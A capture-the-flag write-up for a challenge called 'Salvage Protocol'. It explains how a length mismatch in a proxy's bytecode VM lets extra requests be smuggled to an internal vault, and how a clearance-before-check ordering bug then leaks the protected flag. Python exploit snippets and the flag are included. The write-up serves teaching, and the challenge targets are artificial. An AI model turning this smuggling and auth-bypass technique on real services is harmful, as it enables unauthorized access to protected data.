# Salvage Protocol

**Category:** Pwn | **Points:** 481 | **Author:** ludicrouslytrue | **Flag:** `zdk{sa1VAG3d_thrOugh_7HE_53Am}`

## Description
> something something protocol

## TL;DR
Two networked services: a public proxy (`reclaimd`) that guards an internal vault (`vaultd`). `reclaimd` lets the *real* body size disagree with the *declared* body size, which smuggles extra requests into one vault frame. Inside the vault, AUTH sets your clearance **before** it checks your token — so a deliberately-failed AUTH followed by a GET reads the protected `vault/flag`. No shellcode, no ROP: the whole bug lives in the protocol.

## Initial Analysis

Two stripped, statically-linked 64-bit ELFs:

```text
$ file reclaimd vaultd
reclaimd: ELF 64-bit LSB executable, x86-64, statically linked, stripped
vaultd:   ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

```text
Arch: amd64 | RELRO: Partial | Stack: No canary | NX: Enabled | PIE: No
```

Those flags scream "buffer overflow / ROP" — but that's a red herring. Under `strace` the roles are clear:

```text
reclaimd -> listens on 0.0.0.0:1337
vaultd   -> listens on 127.0.0.1:9001   (opens /sealed/flag)
```

`reclaimd` connects to the internal vault port, so it's a restricted proxy protecting `vaultd`. Confirming strings:

```text
[reclaimd] vault offline
ACCESS SEALED: clearance required
scrap/%u
vault/flag
```

## Vulnerability / Core Concept

There are two cooperating bugs.

**Bug 1 — length mismatch in `reclaimd` (the seam).** Both services speak a length-prefixed TCP protocol (4-byte big-endian N, then N bytes). `reclaimd` runs a tiny bytecode VM (entry around `0x401a90`) whose state holds a `declared_data_len` and a `real_data_len` *separately*:

```c
struct vm_state {
    uint8_t  action;
    char     name[256];
    uint16_t name_len;
    uint16_t declared_data_len;   // opcode 0x10 sets this
    uint8_t  data[4096];          // opcode 0x20 / 0x11 fill this
    uint16_t real_data_len;
};
```

The opcodes that matter:

| Opcode | Meaning |
|---|---|
| `0x02 <index>` | Select `scrap/<index>`, action = GET |
| `0x10 <be16>` | Set the **declared** data length in the vault header |
| `0x11 <byte>` | Append one byte to the **real** body |
| `0x20 <len> <bytes>` | Replace body with up to 255 bytes |
| `0x30` | Build and send the request to `vaultd` |
| `0x00` | Halt |

The internal vault protocol packs one or more requests back-to-back in a frame, each `action(1) | name_len(2 BE) | name | data_len(2 BE) | data`. Because we can stuff a big *real* body but declare its length as **zero**, `vaultd` thinks the harmless `scrap/0` request ends right after its length field — and parses the leftover bytes as *fresh requests* on the same connection. That's classic request smuggling.

**Bug 2 — premature clearance in `vaultd`.** The vault seeds public records `scrap/0..4` plus a protected `vault/flag` holding a random 4-byte token. AUTH (action 3) expects `0x400` bytes and compares the first four against that token — but it sets clearance *first*:

```c
record = find_record(name);
connection_clearance = record->id;   // happens too early!
if (data_len == 0x400 && first_four_bytes(data) == record->token)
    return record->contents;
return DENIED;
```

The GET path only checks `connection_clearance == record->id`. So a **failed** AUTH still leaves the connection cleared for `vault/flag`, and a following GET on the same connection walks right in. The guard updates the guest list before checking your ID.

## Exploitation

Full script in [`solve.py`](./solve.py). Two smuggled vault requests:

```python
name = b'vault/flag'
smuggled = vquery(3, name, b'\0' * 0x400) + vquery(2, name)  # bad AUTH, then GET
```

Then a VM program that selects `scrap/0`, loads the smuggled bytes into the *real* body, lies about the declared length, and flushes:

```python
program  = b'\x02\x00'                                    # GET scrap/0
program += b'\x20' + p8(255) + smuggled[:255]             # first 255 body bytes
program += b''.join(b'\x11' + p8(c) for c in smuggled[255:])  # append the rest
program += b'\x10\x00\x00'                                 # declared length = 0  <-- the seam
program += b'\x30\x00'                                     # forward, halt
```

`vaultd` then processes three requests on one connection: GET `scrap/0` (harmless), bad AUTH `vault/flag` (denied, but sets clearance), GET `vault/flag` (returns the flag). Locally, with no `/sealed/flag` provisioned, the vault falls back to `FLAG_NOT_PROVISIONED` — which still confirms the protected read succeeded.

### Note on artifacts
The `reclaimd` and `vaultd` binaries are not committed here (statically-linked, large). `solve.py` only needs the network endpoint.

### Running it

```bash
./solve.py                                    # local, HOST=127.0.0.1 PORT=1337
./solve.py HOST=<host> PORT=1337 SSL          # remote (TLS)
```

Remote output:

```text
rusted hull plating; mass 1.2t; oxidation heavy    <- scrap/0
[vault] denied                                     <- failed AUTH
zdk{sa1VAG3d_thrOugh_7HE_53Am}                     <- vault/flag
```

## Flag
`zdk{sa1VAG3d_thrOugh_7HE_53Am}`

## Key Takeaways
- A "pwn" binary with textbook-weak mitigations can still be a pure logic/protocol challenge — read what it *does* before reaching for ROP.
- Any place where a declared length can disagree with the actual length is a request-smuggling seam.
- State changes (like clearance) must happen only *after* the check that authorizes them; ordering bugs are auth bypasses.
